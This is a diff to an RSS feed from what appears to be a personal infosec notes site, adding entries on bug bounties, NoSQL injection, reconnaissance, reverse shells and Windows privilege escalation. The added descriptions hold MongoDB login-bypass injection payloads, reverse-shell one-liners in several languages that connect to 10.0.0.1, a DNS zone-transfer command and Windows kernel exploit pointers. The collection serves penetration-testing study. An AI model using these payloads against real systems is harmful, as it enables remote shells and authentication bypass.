@@ -21,6 +21,16 @@ Links  https://rastamouse.me - hacking Windows  </description>
     </item>
     
     <item>
+      <title>Bug Bounty</title>
+      <link>https://d47zm3.me/resources/infosec/bugbounty/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/bugbounty/</guid>
+      <description> Communities Bug Bounty Notes - founded by zseano, challenges, writeups, etc.
+Bug Bounty Tips </description>
+    </item>
+    
+    <item>
       <title>Burp Suite Proxy</title>
       <link>https://d47zm3.me/resources/infosec/burp-suite-proxy/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -117,6 +127,16 @@ Sites  Hot and fresh guide from OWASP for iOS and Android available here.
     </item>
     
     <item>
+      <title>No-SQL Injection</title>
+      <link>https://d47zm3.me/resources/infosec/no-sql-injection/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/no-sql-injection/</guid>
+      <description>MongoDB login bypass We can also try to insert $ge instead of $ne operator and try to inject these instead of index names (username/password).
+MongoDB injections true, $where: &amp;#39;1 == 1&amp;#39; , $where: &amp;#39;1 == 1&amp;#39; $where: &amp;#39;1 == 1&amp;#39; &amp;#39;, $where: &amp;#39;1 == 1&amp;#39; 1, $where: &amp;#39;1 == 1&amp;#39; { $ne: 1 } &amp;#39;, $or: [ {}, { &amp;#39;a&amp;#39;:&amp;#39;a &amp;#39; } ], $comment:&amp;#39;successful MongoDB injection&amp;#39; db.injection.insert({success:1}); db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1 || 1==1 &amp;#39; &amp;amp;&amp;amp; this.</description>
+    </item>
+    
+    <item>
       <title>OSINT</title>
       <link>https://d47zm3.me/resources/infosec/osint/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -175,6 +195,30 @@ Stage 1: decrypt cookie root@bethebeast: ~ » padbuster http://hacker.com/profil
       
       <guid>https://d47zm3.me/resources/infosec/personal-security-checklist/</guid>
       <description>Be safe on the internet - An open source checklist of resources designed to improve your online privacy and security. Check things off to keep track as you go.</description>
+    </item>
+    
+    <item>
+      <title>Reconnaissance</title>
+      <link>https://d47zm3.me/resources/infosec/reconnaissance/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/reconnaissance/</guid>
+      <description> Everything from port scanning, to service mapping, passive OSINT etc.
+Presentations  Recon Like a Boss  Links  Assesments Mindset  DNS Checking who can issue certificate for domain
+dig @nameserver record.com CAA GeoIP Lookup
+geoiplookup 1.2.3.4 Reverse DNS Discovery
+dig axfr @192.43.14.3 168.192.in-addr.arpa DNSSEC records
+dig +multi @192.10.51.3 witrap.com RRSIGdig +multi @192.10.51.3 witrap.com DNSKEY</description>
+    </item>
+    
+    <item>
+      <title>Reverse Shells</title>
+      <link>https://d47zm3.me/resources/infosec/reverse-shells/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/reverse-shells/</guid>
+      <description>Reverse shells in various languages/platforms.
+# bash bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1 # perl perl -e &amp;#39;use Socket;$i=&amp;#34;10.0.0.1&amp;#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);exec(&amp;#34;/bin/sh -i&amp;#34;);};&amp;#39; # python python -c &amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.0.0.1&amp;#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39; # php php -r &amp;#39;$sock=fsockopen(&amp;#34;10.0.0.1&amp;#34;,1234);exec(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;#34;);&amp;#39; # ruby ruby -rsocket -e&amp;#39;f=TCPSocket.open(&amp;#34;10.0.0.1&amp;#34;,1234).to_i;exec sprintf(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&amp;#34;,f,f,f)&amp;#39; # netcat nc -e /bin/sh 10.0.0.1 1234 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.0.0.1 1234 &amp;gt;/tmp/f # java r = Runtime.getRuntime() p = r.</description>
     </item>
     
     <item>
@@ -248,6 +292,15 @@ rdesktop -uname -peasypassword -r disk:share=exploits/ 10.2.2.1 etcd - fetch key
       
       <guid>https://d47zm3.me/resources/infosec/wapt-online-courses/</guid>
       <description> Google Docs Sheet with lots of links  </description>
+    </item>
+    
+    <item>
+      <title>Windows Privilege Escalation</title>
+      <link>https://d47zm3.me/resources/infosec/windows-privilege-escalation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/windows-privilege-escalation/</guid>
+      <description>Windows Exploit/OS Reference Scripts  JAWS Sherlock Powerup Google Windows Version for common exploits  Kernel Exploits  systeminfo -&amp;gt; look up missing kb&amp;rsquo;s systeminfo | findstr /B /C:&amp;ldquo;OS Name&amp;rdquo; /C:&amp;ldquo;OS * Version&amp;rdquo; sherlock -&amp;gt; Find-AllVulns powershell  Common Kernel Exploits  MS16-014 - applies to: Windows 7 SP1 x86 MS16-016 - &amp;lsquo;WebDAV&amp;rsquo; applies to Windows 7 SP1 x86 (Build 7601) MS16-032 - applies to: Windows 7 x86/x64, Windows 8 x86/64, Windows 10, Windows Server 2008-2012 R2  Config Files Credentials in ClearText or Base64 -&amp;gt; once Windows in installed</description>
     </item>
     
     <item>
